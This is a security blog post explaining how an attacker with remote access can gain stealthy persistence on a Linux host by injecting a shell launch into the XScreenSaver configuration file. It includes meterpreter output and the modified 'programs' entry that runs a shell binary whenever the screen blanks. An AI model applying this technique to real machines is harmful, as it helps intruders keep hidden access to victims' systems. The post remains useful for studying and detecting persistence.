---
layout: post
title: Persistent Code Execution via XScreenSaver
date: 2019-03-03
categories:
  - linux
  - security
tags:
  - xscreensaver
  - shell
  - persistence
  - offsec
image: /assets/images/2019-03-03-persistent-code-execution-via-xscreensaver/xscreensaver.png
---
After successfully gaining remote access to a host, acquiring some form of persistence is usually on the cards in case of network problems, system reboots etc. There are many ways to do this but one way I discovered recently, I thought was quite discrete in comparison to other methods (editing shell rc files, crontabs etc.).

The method I came across was to modify the configuration file of XScreenSaver, a very common screensaver package for Linux, to execute a shell. [mis]Using XScreenSaver offers a couple of benefits:

* Users will rarely edit this file, meaning there is less chance of the shell being noticed
* The screen is almost guaranteed to blank on a regular basis, resulting in the shell executing

To demonstrate this, I have setup a Ubuntu 18.10 host running XScreenSaver 5.42 and have a remote shell to it.

Identifying XScreenSaver Presence & Configuration
-------------------------------------------------
To determine if XScreenSaver is installed,
The configuration file for XScreenSaver can be found in a user's home directory and is named `.xscreensaver`:

```shell_session
meterpreter > ls -S xscreensaver
Listing: /home/rastating
========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  8804  fil   2019-03-07 21:49:13 +0000  .xscreensaver
````

If the configuration file is missing, it does not mean that XScreenSaver is not available, but that the user has not configured their screensaver preferences. In which case, you can create a fresh configuration file and drop it in place.

As there are packages readily available to install it, it is possible to use the system's package manager to verify if it is installed. For example, in Debian / Ubuntu, you can use `dpkg` to verify:

```shell_session
$ dpkg -s xscreensaver | grep -i status
Status: install ok installed
```

If it has been built from source, the presence of the following binaries would also suggest it is installed:

* xscreensaver
* xscreensaver-command
* xscreensaver-demo
* xscreensaver-getimage
* xscreensaver-getimage-file
* xscreensaver-getimage-video
* xscreensaver-gl-helper
* xscreensaver-text

In this case, I had selected a screensaver to use and thus the configuration file existed. Examining the configuration file reveal three key pieces of information:

* The `timeout` value: how long the session must remain inactive before the screensaver is displayed
* The `mode`: whether or not a single screensaver is used, or whether random screensavers are chosen each time
* The `selected` screensaver

As can be seen in the below snippet of the configuration file, the `timeout` value is set to `0:01:00`, meaning the screensaver will run after one minute of inactivity:

```yaml
# XScreenSaver Preferences File
# Written by xscreensaver-demo 5.42 for rastating on Thu Mar  7 21:49:13 2019.
# https://www.jwz.org/xscreensaver/

timeout:        0:01:00
cycle:          0:10:00
lock:           False
lockTimeout:    0:00:00
passwdTimeout:  0:00:30
```

Moving a bit further down the file, we can see the `mode` setting is `one` which indicates that a single screensaver has been selected. We can also see the `selected` setting, which indicates the selected screensaver is the one found at index position `2` of the `programs` array. As the array starts at `0`, this means that in this instance, the `attraction` screensaver has been selected:

```yaml
mode:         one
selected:     2

textMode:     url
textLiteral:  XScreenSaver
textFile:
textProgram:  fortune
textURL:      http://feeds.feedburner.com/ubuntu-news

programs:                                                   \
              maze -root                                  \n\
- GL:         superquadrics -root                         \n\
              attraction -root                            \n\
              blitspin -root                              \n\
              greynetic -root                             \n\
```

Adding a Shell To The Configuration File
----------------------------------------
Looking at the `programs` array of the configuration file, you may have figured out that these strings aren't just the names of the screensavers that are available, but the base commands that will be executed. In XScreenSaver, each screensaver is a separate binary that when executed will display the fullscreen screensaver.

In the configuration previously shown, when the screen blanks, it would shell out the command:

`/usr/lib/xscreensaver/attraction -root`

With this in mind, we can inject a command at the end of the base command in order to launch our shell alongside the screensaver. As I had a shell located in `/home/rastating/.local/share/shell.elf`, I modified the `.xscreensaver` to launch this. The previous snippet of the configuration file now looks like this:

```yaml
mode:         one
selected:     2

textMode:     url
textLiteral:  XScreenSaver
textFile:
textProgram:  fortune
textURL:      http://feeds.feedburner.com/ubuntu-news

programs:                                                   \
              maze -root                                  \n\
- GL:         superquadrics -root                         \n\
              attraction -root |                            \
               (/home/rastating/.local/share/shell.elf&)  \n\
              blitspin -root                              \n\
              greynetic -root                             \n\
```

There are two things to note with this change. The first is that the `\n\` that was at the end of the `attraction` line has been replaced with a single backslash. This indicates that the string is continuing onto a second line. The `\n` is the delimiter, and thus only appears at the end of the full command.

The second thing to note is the use of `|` and `&`, the shell is called in this way to ensure that it is launched alongside the `attraction` binary and that it does not halt execution by forking it into the background.

Once this change is made, XScreenSaver will automatically pick up the change, as per [The Manual](https://www.jwz.org/xscreensaver/man1.html):

> If you change a setting in the .xscreensaver file while xscreensaver is already running, it will notice this, and reload the file. (The file will be reloaded the next time the screen saver needs to take some action, such as blanking or unblanking the screen, or picking a new graphics mode.)

With this change in place, the shell will now be executed alongside the screensaver binary as can be seen in the video below:

<div class="video-container">
  <video class="video-js video" controls preload="auto" poster="{{ site.baseurl }}/assets/images/2019-03-03-persistent-code-execution-via-xscreensaver/xscreensaver-shell.jpg" data-setup="{}">
    <source src="{{ site.baseurl }}/assets/videos/xscreensaver-shell.mp4" type="video/mp4">
    <p class="vjs-no-js">
      To view this video please enable JavaScript, and consider upgrading to a web browser that <a href="https://videojs.com/html5-video-support/">supports HTML5 video</a>
    </p>
  </video>
</div>
